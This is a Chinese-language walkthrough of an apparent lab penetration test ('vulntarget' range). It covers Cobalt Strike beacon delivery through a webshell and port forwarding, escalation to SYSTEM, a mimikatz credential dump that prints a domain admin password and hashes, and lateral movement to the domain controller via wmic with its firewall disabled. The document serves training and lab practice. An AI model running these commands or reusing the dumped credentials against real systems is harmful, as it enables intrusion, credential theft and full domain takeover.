# 七 重新投递beacon（反向连接）

## 一 开启端口转发，让cs服务器直接能联通到内网机器

### 1. 端口转发：


```
rportfwd 8088 127.0.0.1 8088
```
这里的127.0.0.1是cs的服务端，也就是kali，直接使用127.0.0.1

将web机器的8088端口和kali的8088端口联通


### 2.测试端口

注意：内网机器10.0.20.99可能并不能正常联通web机器10.20.0.98的8088端口

借用shell.php在内网机器99上查看是否能够访问：

```
proxychains4 curl -d "1=system('powershell -c \"Test-NetConnection 10.0.20.98 -Port 8088\"');" http://10.0.20.99/shell.php
```


结果：
```
──(kali㉿kali)-[~/baji/yukong-a]
└─$ proxychains4 curl -d "1=system('powershell -c \"Test-NetConnection 10.0.20.98 -Port 8088\"');" http://10.0.20.99/shell.php
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1234  ...  10.0.20.99:80  ...  OK
����: TCP connect to 10.0.20.98:8088 failed

  

ComputerName           : 10.0.20.98
RemoteAddress          : 10.0.20.98
RemotePort             : 8088
InterfaceAlias         : Ethernet0
SourceAddress          : 10.0.20.99
PingSucceeded          : True
PingReplyDetails (RTT) : 0 ms
TcpTestSucceeded       : False
```
这里显示flase，说明是不能正常访问

解决办法：

1.强制10.0.20.98（web机器）的防火墙放行8088端口：
在98的beacon输入：
```
shell netsh advfirewall firewall add rule name="Allow8088" dir=in action=allow protocol=TCP localport=8088
```

2.重新配置端口转发：
```
# 明确绑定 0.0.0.0 (所有网卡) rportfwd 0.0.0.0 8088 127.0.0.1 8088
```

检查：
在beacon输入
```
shell netstat -ano | findstr 8088
```
必须看到`0.0.0.0:8088` 正在 LISTENING，允许所有IP

再次验证是否能正常访问:
```
proxychains4 curl -d "1=system('powershell -c \"Test-NetConnection 10.0.20.98 -Port 8088\"');" http://10.0.20.99/shell.php
```
结果：
```
┌──(kali㉿kali)-[~/baji/yukong-a]

└─$ proxychains4 curl -d "1=system('powershell -c \"Test-NetConnection 10.0.20.98 -Port 8088\"');" http://10.0.20.99/shell.php
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1234  ...  10.0.20.99:80  ...  OK



ComputerName     : 10.0.20.98
RemoteAddress    : 10.0.20.98
RemotePort       : 8088
InterfaceAlias   : Ethernet0
SourceAddress    : 10.0.20.99
TcpTestSucceeded : True
```
已经能正常访问

## 二 连接蚁剑

### 2.1 设置beacon的socks5代理

![[Pasted image 20260416153246.png]]
代理之后，点击测试连接，输入内网机器10.0.20.99的IP进行测试，测试成功

![[Pasted image 20260416153320.png]]


使用蚁剑的上传文件功能在10.0.20.99投放beacon，使用cmd功能输入start beacon_x64.exe执行beacon


## 三 制作beacon

#### 2.1 监听
先做一个web机器的8088端口的监听，因为内网机器10.0.20.99它只认识web机器10.0.20.98：
监听地址必须是web'机器的内网IP，端口必须是8088，因为已经做了端口转发，可以正常监听到

![[Pasted image 20260416153040.png]]

### 2.2 制作
![[Pasted image 20260416153654.png]]

必须选择10.0.20.98的监听，然后投放，成功上线



# 八 使用正向连接投递beacon

## 1.关闭内网机器的防火墙

在蚁剑cmd输入：
```
netsh advfirewall set allprofiles state off
```
关闭防火墙

## 2.建立正向监听

![[Pasted image 20260416155641.png]]

选择beaconn TCP类型

## 3.生成并投递beacon

使用正向监听投递beacon

#### 在 98 的 Beacon 里手动连接

这一步最关键，99 不会自动跳出来，你得去“接”它。在 **10.0.20.98** 的 Beacon 控制台输入：


```
connect 10.0.20.99 9966
```

此时10.0.20.99正式上线
但是只有Administrator权限

## 4. 提升权限

#### A. 进程注入 (Process Injection) —— 最快的方式

这是最常用的“白嫖”提权方式：

1. 在 99 的 Beacon 列表中，右键选择 **Explore -> Process List**。
2. 寻找一个由 **`SYSTEM`** 用户运行的稳定进程（例如 `winlogon.exe` 或 `services.exe`）。
3. 选中该进程，点击下方工具栏的 **Inject**。
4. 选择你刚才建立的正向监听器（如 `zx`）。
5. **结果**：你会得到一个新的会话，它作为那个系统进程的子线程运行，权限直接就是 `SYSTEM`。
#### B. 内部提权插件 (Elevate)

Cobalt Strike 自带或加载插件后的功能：

1. 右键点击 99 的会话 -> **Privilege -> Elevate**。
    
2. 选择漏洞利用模块（如经典的 `ms14-058` 或更现代的 `uac-token-duplication`）。
    
3. 选择监听器。
#### C.在beacon输入getsystem

```
getsystem
```
成功


# 九 探测内网机器10.0.20.99的环境

使用cs探测：

## 9.1 探测网段
```
ipconfig /all
```


结果：
```
[04/16 16:26:09] [+] received output:
{82CC4AA7-AABB-4296-94AE-3AB9161E5B11}
	Ethernet
	Intel(R) 82574L Gigabit Network Connection
	00-0C-29-F0-0E-C1
	10.0.20.99
{A7027029-ECC3-4186-BC98-9DCE01AAA9D0}
	Ethernet
	Intel(R) 82574L Gigabit Network Connection #2
	00-0C-29-F0-0E-CB
	10.0.10.111
Hostname: 	win2016
DNS Suffix: 	vulntarget.com
DNS Server: 	10.0.10.110
```

发现网卡2：10.0.10.111，这明显是另一个网段

DNS Suffix: 	vulntarget.com 这里明显是99机器加入了一个域vulntarget.com
## 9.2 探测存活机器

```
arp -a
```

```
[04/16 16:27:06] beacon> arp -a
[04/16 16:27:06] [+] Running arp (T1016, T1018)
[04/16 16:27:06] [*] Running arp (T1016, T1018)
[04/16 16:27:06] [+] host called home, sent: 3760 bytes
[04/16 16:27:06] [+] received output:

Inteface  --- 0x1
Internet Address        Physical Address        Type                    
224.0.0.22                                      static                  
239.255.255.250                                 static                  

Inteface  --- 0x9
Internet Address        Physical Address        Type                    
10.0.20.98              00-0C-29-51-3F-53       dynamic                 
10.0.20.255             FF-FF-FF-FF-FF-FF       static                  
224.0.0.22              01-00-5E-00-00-16       static                  
224.0.0.252             01-00-5E-00-00-FC       static                  
239.255.255.250         01-00-5E-7F-FF-FA       static                  

Inteface  --- 0xC
Internet Address        Physical Address        Type                    
10.0.10.110             00-0C-29-FD-AF-8B       dynamic                 
10.0.10.255             FF-FF-FF-FF-FF-FF       static                  
224.0.0.22              01-00-5E-00-00-16       static                  
224.0.0.252             01-00-5E-00-00-FC       static                  
239.255.255.250         01-00-5E-7F-FF-FA       static  
```

发现另一台机器10.0.10.110

## 9.3 域环境探测

```
whoami
echo %USERDOMAIN%
```
whoami是确认身份
%USERDOMAIN%是探测环境


## 9.4 探测域控

```
shell net group "domain controllers" /domain
```

结果:
```
[04/16 16:34:04] beacon> shell net group "domain controllers" /domain
[04/16 16:34:04] [*] Tasked beacon to run: net group "domain controllers" /domain
[04/16 16:34:04] [+] host called home, sent: 69 bytes
[04/16 16:34:05] [+] received output:
这项请求将在域 vulntarget.com 的域控制器处理。

组名     Domain Controllers
注释     域中所有域控制器

成员

-------------------------------------------------------------------------------
WIN2019$                 
命令成功完成。
[04/16 16:34:04] beacon> shell net group "domain controllers" /domain
[04/16 16:34:04] [*] Tasked beacon to run: net group "domain controllers" /domain
[04/16 16:34:04] [+] host called home, sent: 69 bytes
[04/16 16:34:05] [+] received output:
这项请求将在域 vulntarget.com 的域控制器处理。

组名     Domain Controllers
注释     域中所有域控制器

成员

-------------------------------------------------------------------------------
WIN2019$                 
命令成功完成。
```


**`WIN2019$`** 是 **`vulntarget.com`** 域内唯一的域控制器（Domain）

已知另一台机器10.0.10.110，这个win2019应该就是了




## 9.5 枚举开启SMB服务的机器

```
net view
```

都没开

# 十  抓取票据+横向移动

## 1.抓取域管凭据
在99机器的beacon执行;
```
logonpasswords
```
结果：
```
[04/16 16:44:46] beacon> logonpasswords
[04/16 16:44:46] [*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[04/16 16:44:47] [+] host called home, sent: 313675 bytes
[04/16 16:44:48] [+] received output:

Authentication Id : 0 ; 1288693 (00000000:0013a9f5)
Session           : CachedInteractive from 1
User Name         : Administrator
Domain            : VULNTARGET
Logon Server      : WIN2019
Logon Time        : 2026/4/13 20:19:41
SID               : S-1-5-21-3795598892-1521228294-2653055093-500
	msv :	
	 [00000005] Primary
	 * Username : Administrator
	 * Domain   : VULNTARGET
	 * NTLM     : c7c654da31ce51cbeecfef99e637be15
	 * SHA1     : 20045722851488e55f32110eb0a5222ba793fe2f
	 * DPAPI    : 4df31630e621c2278c303c0940d878ff
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : VULNTARGET
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : VULNTARGET.COM
	 * Password : Admin@666
	ssp :	
	credman :	

Authentication Id : 0 ; 580775 (00000000:0008dca7)
Session           : CachedInteractive from 1
User Name         : Administrator
Domain            : VULNTARGET
Logon Server      : WIN2019
Logon Time        : 2026/4/13 19:21:54
SID               : S-1-5-21-3795598892-1521228294-2653055093-500
	msv :	
	 [00000005] Primary
	 * Username : Administrator
	 * Domain   : VULNTARGET
	 * NTLM     : c7c654da31ce51cbeecfef99e637be15
	 * SHA1     : 20045722851488e55f32110eb0a5222ba793fe2f
	 * DPAPI    : 4df31630e621c2278c303c0940d878ff
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : VULNTARGET
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : VULNTARGET.COM
	 * Password : Admin@666
	ssp :	
	credman :	

Authentication Id : 0 ; 393714 (00000000:000601f2)
Session           : Interactive from 1
User Name         : win2016
Domain            : VULNTARGET
Logon Server      : WIN2019
Logon Time        : 2026/4/13 19:20:42
SID               : S-1-5-21-3795598892-1521228294-2653055093-1601
	msv :	
	 [00000005] Primary
	 * Username : win2016
	 * Domain   : VULNTARGET
	 * NTLM     : dfc8d2bfa540a0a6e2248a82322e654e
	 * SHA1     : cfa10f59337120a5ea6882b11c1c9f451f5f4ea6
	 * DPAPI    : 27bd7cc4802079a6e008ed2d917c4323
	tspkg :	
	wdigest :	
	 * Username : win2016
	 * Domain   : VULNTARGET
	 * Password : (null)
	kerberos :	
	 * Username : win2016
	 * Domain   : VULNTARGET.COM
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 72477 (00000000:00011b1d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/4/13 19:18:35
SID               : S-1-5-90-0-1
	msv :	
	 [00000005] Primary
	 * Username : WIN2016$
	 * Domain   : VULNTARGET
	 * NTLM     : e5cf7de3e52fe85a34c81d6a182b260e
	 * SHA1     : 4628765c85cc4ad9d52c74eea3ebb1531a98dd08
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : VULNTARGET
	 * Password : (null)
	kerberos :	
	 * Username : WIN2016$
	 * Domain   : vulntarget.com
	 * Password : 8f ca be 36 c6 aa d1 84 e9 ef 44 6f f8 75 fe 18 2a ea 32 8e f9 be 91 26 18 ef 80 27 9a 57 0b dc a4 06 58 80 05 ee a3 33 d9 d9 25 93 1b 99 25 78 42 88 1c d6 aa 4c 64 f3 87 b6 85 25 30 5a ba 94 9a ec 8c b9 b1 91 d0 e2 78 d4 df ab 81 62 5d 6f da da af d3 7e fd 3f 97 fb 5c 54 bb 5e e1 a1 ff a4 a3 8e 43 92 ce 99 c1 89 21 f0 ba f1 a2 df 15 01 a3 15 b9 db 66 c7 43 fd 34 6c f2 ce 54 74 60 3a 1d af f3 28 45 44 a0 ea 16 df 38 48 5b 76 40 a4 df 27 d7 71 fc f6 7e 1f 6b 83 b1 6d 04 91 56 db 6f 1d 5b e8 52 ff b3 02 46 68 4e 60 89 ac 2d 35 ee 21 ad f8 99 3c 0c 8b 0c 67 b7 75 3c ff d7 7d f6 b7 80 71 4e 61 5b 26 11 0a 83 f8 03 18 f0 89 0c 79 2e db a7 7a 0c 56 84 d1 cc c7 7d 63 27 57 7a 2a 41 8c 8c 57 d1 cd bc eb 36 f3 aa ee 25 
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN2016$
Domain            : VULNTARGET
Logon Server      : (null)
Logon Time        : 2026/4/13 19:18:34
SID               : S-1-5-20
	msv :	
	 [00000005] Primary
	 * Username : WIN2016$
	 * Domain   : VULNTARGET
	 * NTLM     : e5cf7de3e52fe85a34c81d6a182b260e
	 * SHA1     : 4628765c85cc4ad9d52c74eea3ebb1531a98dd08
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : VULNTARGET
	 * Password : (null)
	kerberos :	
	 * Username : win2016$
	 * Domain   : VULNTARGET.COM
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 1411418 (00000000:0015895a)
Session           : CachedInteractive from 1
User Name         : Administrator
Domain            : VULNTARGET
Logon Server      : WIN2019
Logon Time        : 2026/4/13 20:28:31
SID               : S-1-5-21-3795598892-1521228294-2653055093-500
	msv :	
	 [00000005] Primary
	 * Username : Administrator
	 * Domain   : VULNTARGET
	 * NTLM     : c7c654da31ce51cbeecfef99e637be15
	 * SHA1     : 20045722851488e55f32110eb0a5222ba793fe2f
	 * DPAPI    : 4df31630e621c2278c303c0940d878ff
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : VULNTARGET
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : VULNTARGET.COM
	 * Password : Admin@666
	ssp :	
	credman :	

Authentication Id : 0 ; 68761 (00000000:00010c99)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/4/13 19:18:34
SID               : S-1-5-90-0-1
	msv :	
	 [00000005] Primary
	 * Username : WIN2016$
	 * Domain   : VULNTARGET
	 * NTLM     : e5cf7de3e52fe85a34c81d6a182b260e
	 * SHA1     : 4628765c85cc4ad9d52c74eea3ebb1531a98dd08
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : VULNTARGET
	 * Password : (null)
	kerberos :	
	 * Username : WIN2016$
	 * Domain   : vulntarget.com
	 * Password : 8f ca be 36 c6 aa d1 84 e9 ef 44 6f f8 75 fe 18 2a ea 32 8e f9 be 91 26 18 ef 80 27 9a 57 0b dc a4 06 58 80 05 ee a3 33 d9 d9 25 93 1b 99 25 78 42 88 1c d6 aa 4c 64 f3 87 b6 85 25 30 5a ba 94 9a ec 8c b9 b1 91 d0 e2 78 d4 df ab 81 62 5d 6f da da af d3 7e fd 3f 97 fb 5c 54 bb 5e e1 a1 ff a4 a3 8e 43 92 ce 99 c1 89 21 f0 ba f1 a2 df 15 01 a3 15 b9 db 66 c7 43 fd 34 6c f2 ce 54 74 60 3a 1d af f3 28 45 44 a0 ea 16 df 38 48 5b 76 40 a4 df 27 d7 71 fc f6 7e 1f 6b 83 b1 6d 04 91 56 db 6f 1d 5b e8 52 ff b3 02 46 68 4e 60 89 ac 2d 35 ee 21 ad f8 99 3c 0c 8b 0c 67 b7 75 3c ff d7 7d f6 b7 80 71 4e 61 5b 26 11 0a 83 f8 03 18 f0 89 0c 79 2e db a7 7a 0c 56 84 d1 cc c7 7d 63 27 57 7a 2a 41 8c 8c 57 d1 cd bc eb 36 f3 aa ee 25 
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2026/4/13 19:18:34
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 41186 (00000000:0000a0e2)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2026/4/13 19:18:34
SID               : 
	msv :	
	 [00000005] Primary
	 * Username : WIN2016$
	 * Domain   : VULNTARGET
	 * NTLM     : e5cf7de3e52fe85a34c81d6a182b260e
	 * SHA1     : 4628765c85cc4ad9d52c74eea3ebb1531a98dd08
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN2016$
Domain            : VULNTARGET
Logon Server      : (null)
Logon Time        : 2026/4/13 19:18:34
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : VULNTARGET
	 * Password : (null)
	kerberos :	
	 * Username : win2016$
	 * Domain   : VULNTARGET.COM
	 * Password : (null)
	ssp :	
	credman :	
```

* Username : Administrator
* Domain   : VULNTARGET.COM
* Password : Admin@666
获得域控明文用户密码
还有Administrator 的 **NTLM Hash**:c7c654da31ce51cbeecfef99e637be15
 * Username : Administrator
	 * Domain   : VULNTARGET
	 * NTLM     : c7c654da31ce51cbeecfef99e637be15
	 * SHA1     : 20045722851488e55f32110eb0a5222ba793fe2f
	 * DPAPI    : 4df31630e621c2278c303c0940d878ff




## 二：横向移动


### 2.1 直接使用psexec上线域控

```
psexec 10.0.10.110 Administrator Admin@666 zx
```
我的cs没有这个指令，直接使用jump：
```
jump psexec 10.0.10.110 zxz
```
jump被拒绝了


### 2.2：WMIExec (绕过 SMB 限制)

WMI（Windows 管理规范）通常比 `psexec` 更容易绕过权限限制，因为它不依赖 `ADMIN$` 共享写入服务。

#### 第一步：手动建立连接（验证密码）

在 99 的 Beacon 交互窗口输入：


```
shell net use \\10.0.10.110\c$ "Admin@666" /user:VULNTARGET\Administrator
```

- **如果成功**：说明密码没问题，且 110 的 C 盘你可以访问。

- **如果报错**：说明 110 可能开启了防火墙拦截了 445 端口。

成功，这说明我们能够访问10.0.10.110的c盘

#### 第二步：手动拷贝beacon：
```
shell copy C:\zxz.exe \\10.0.10.110\C$\Windows\Temp\zxz.exe
```

成功拷贝

#### 第三步：使用 WMI 远程启动（避开权限拒绝）

既然 `psexec` 创建服务失败，我们直接用 WMI 启动进程：


```
shell wmic /node:10.0.10.110 /user:VULNTARGET\Administrator /password:Admin@666 process call create "C:\Windows\Temp\zxz.exe"
```

> **注意**：如果执行完显示 `ReturnValue = 0; ProcessId = [某个数字]`，说明木马已经跑起来了！

结果
```
[04/16 17:01:09] [+] received output:
方法执行成功。

外参数:
instance of __PARAMETERS
{
	ProcessId = 5104;
	ReturnValue = 0;
};

```
成功
#### 四步：去“接”域控上线

在 99 机器的 Beacon 控制台输入：


```
# 注意端口要和你 zxz 监听器设置的一样，假设是 9898
connect 10.0.10.110 9898
```

```
connect 10.0.10.110 9898
```

失败，但是木马确实运行了，可能是110的防火墙阻止了：

手工关闭防火墙：
```
shell wmic /node:10.0.10.110 /user:VULNTARGET\Administrator /password:Admin@666 process call create "netsh advfirewall set allprofiles state off"
```

再次上线beacon：
```
connect 10.0.10.110 9898
```

上线成功

```
打点与边界突破： 通过对 OA 资产进行黑盒审计，识别出**附件处理模块存在权限校验缺陷**。通过构造特定 Multipart 请求实现远程代码执行（RCE），并利用**内存加载技术**部署 Cobalt Strike Beacon，规避文件落地检测，成功建立初始通信据点。
    
 多层内网横向与穿透： 构建多级加密代理隧道，对第二层业务网段进行指纹探测，发现关键业务服务器存在 Redis 未授权访问漏洞**。利用**写 WebShell 的复合利用方案**成功接管该网段核心主机。针对第三层隔离网段，利用 CS 级联代理与正向 TCP 端口监听技术，成功绕过防火墙对反向流量的拦截。
    
 凭据挖掘与域控攻克： 在成员服务器上利用 Token Impersonation（令牌窃取）技术提权至 SYSTEM。通过Mimikatz 深度还原 LSA 内存数据**，获取域管理员（Domain Admin）明文凭据。针对域控（DC）拒绝 SMB 协议写入的防御策略，改用 **WMIExec 协议**调用系统组件远程启动 Payload，并配合 **Netsh** 动态调整防火墙策略，最终实现对域控制器的完全接管。
```